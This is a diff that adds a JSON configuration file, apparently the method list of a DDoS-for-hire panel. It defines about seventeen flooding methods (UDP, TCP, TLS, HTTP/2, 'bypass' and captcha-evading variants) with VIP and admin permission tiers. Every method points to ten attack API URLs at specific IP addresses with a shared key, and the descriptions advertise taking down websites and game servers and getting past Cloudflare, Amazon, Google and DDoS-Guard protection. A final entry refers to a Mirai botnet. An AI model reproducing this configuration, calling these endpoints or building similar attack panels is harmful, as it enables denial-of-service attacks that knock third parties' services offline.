@@ -1,0 +1,322 @@
+[
+	{
+		"name":"scrape",
+		"time":86000,
+		"description":"High Gbps UDP Traffic Attack Targeting Open Ports (Only Admin)",
+		"permission":["admin"],
+		"api":[
+			"http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
+		    "http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
+		    "http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
+		    "http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
+		    "http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
+		    "http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
+		    "http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
+		    "http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp"
+		]
+	},
+	{
+		"name":"tcp",
+		"time":86000,
+		"description":"Attack Ip Website Or Ip game (Max 120s)",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+            "http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
+			"http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",	
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp"
+		]	   		
+	},
+	{
+		"name":"storm",
+		"time":86000,
+		"description":"Attack Ip Website Or Ip game (Max 120s)",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+            "http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=storm",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=storm",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=storm",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=storm",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=storm",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=storm",
+			"http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=storm",	
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=storm",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=storm",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=storm"
+	   ]	   		
+	},
+	{
+		"name":"tls-lost",
+		"time":86000,
+		"description":"Attack Ip Website Or Ip game (Max 120s)",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+            "http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-lost",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-lost",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-lost",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-lost",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-lost",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-lost",
+			"http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-lost",	
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-lost",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-lost",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-lost"
+		]
+    },
+    {      		
+		"name":"h2-blast",
+		"time":86000,
+		"description":"Attack Ip Website Or Ip game (Max 120s)",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+            "http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-blast",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-blast",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-blast",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-blast",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-blast",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-blast",
+			"http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-blast",	
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-blast",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-blast",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-blast"
+		]		   		
+	},
+	{
+		"name":"h2-hold",
+		"time":86000,
+		"description":"Attack Ip Website Or Ip game (Max 120s)",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+            "http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-hold",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-hold",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-hold",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-hold",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-hold",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-hold",
+			"http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-hold",	
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-hold",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-hold",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-hold"
+		]
+    },
+    {  
+		"name":"killnet",
+		"time":86000,
+		"description":"High R/s And Cloudflare, Google llc, Amazon",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+            "http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
+            "http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
+            "http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
+            "http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=kill",
+            "http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
+            "http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
+            "http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",           
+            "http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",  
+            "http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
+            "http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet"
+          ]
+    },
+    {
+		"name":"bypass-x",
+		"time":86000,
+		"description":"High R/s And Cloudflare, Google llc, Amazon",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+            "http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
+            "http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
+            "http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
+            "http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
+            "http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
+            "http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
+            "http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",          
+            "http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
+            "http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
+            "http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x"
+          ]
+      },
+     {
+		"name":"h2-mix",
+		"time":86000,
+		"description":"High R/s And Cloudflare, Google llc, Amazon",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+            "http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
+            "http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
+            "http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
+            "http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
+            "http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
+            "http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
+            "http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
+            "http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",        
+            "http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
+            "http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix"
+            ]
+        },
+        {
+		"name":"https",
+		"time":86000,
+		"description":"High R/s And Cloudflare, Google llc, Amazon",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+            "http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
+            "http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
+            "http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
+            "http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
+            "http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
+            "http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
+            "http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
+            "http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
+            "http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
+            "http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https"
+		]
+    },
+	{
+		"name":"tls",
+		"time":86000,
+		"description":"High R/s And Cloudflare, Google llc, Amazon",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+            "http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
+            "http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
+            "http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
+            "http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
+            "http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
+            "http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
+            "http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
+            "http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
+            "http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
+            "http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls"
+		]
+    },
+    {
+		"name":"x-hit",
+		"time":86000,
+		"description":"Hard Website And 0 Http DDoS",
+		"permission":["vvip", "admin"],
+		"api":[
+			"http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
+			"http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit"
+		]
+	},
+	{
+		"name":"bypass",
+		"time":86000,
+		"description":"Cloudflare Inc, Google llc, Amazon,",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+			"http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
+			"http:/167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass"
+		]
+    },
+    {
+		"name":"browsern",
+		"time":86000,
+		"description":"Bypassing Captcha, Uam, Captcha Turnstile",
+		"permission":["vvip","admin"],
+		"api":[
+			"http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
+			"http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern"
+		]
+    },
+    {
+		"name":"tcp-pps",
+		"time":86000,
+		"description":"Attack Ip Game ",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+			"http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
+			"http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps"
+		]
+	},
+    {
+		"name":"quantum",
+		"time":86000,
+		"description":"Bypassing Cloudflare Inc, Amazon, Google Llc, DDoS Guard",
+		"permission":["vip", "admin"],
+		"api":[
+			"http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=quantum",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=quantum",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=quantum",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=quantum",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=quantum",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=quantum",
+			"http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=quantum",
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=quantum",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=quantum",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=quantum"
+		]
+    },
+    {
+		"name":"c-f",
+		"time":86000,
+		"description":"hard website And Fast Down",
+		"permission":["vip", "vvip", "admin"],
+		"api":[
+			"http://178.128.26.91:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
+			"http://206.189.40.80:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
+			"http://159.223.33.97:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
+			"http://157.245.156.38:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
+			"http://139.59.114.64:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
+			"http://134.209.99.205:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
+			"http://167.99.64.30:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
+			"http://68.183.177.204:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
+			"http://167.172.77.84:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
+			"http://152.53.125.71:5032/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f"
+		]
+	},
+	{
+		"name":"bigddos",
+		"time":2111,
+		"description":"hacker",
+		"permission":[],
+        "botnet":{
+            "mirai":"up"
+        }
+
+	}
+]
+
+
+
+
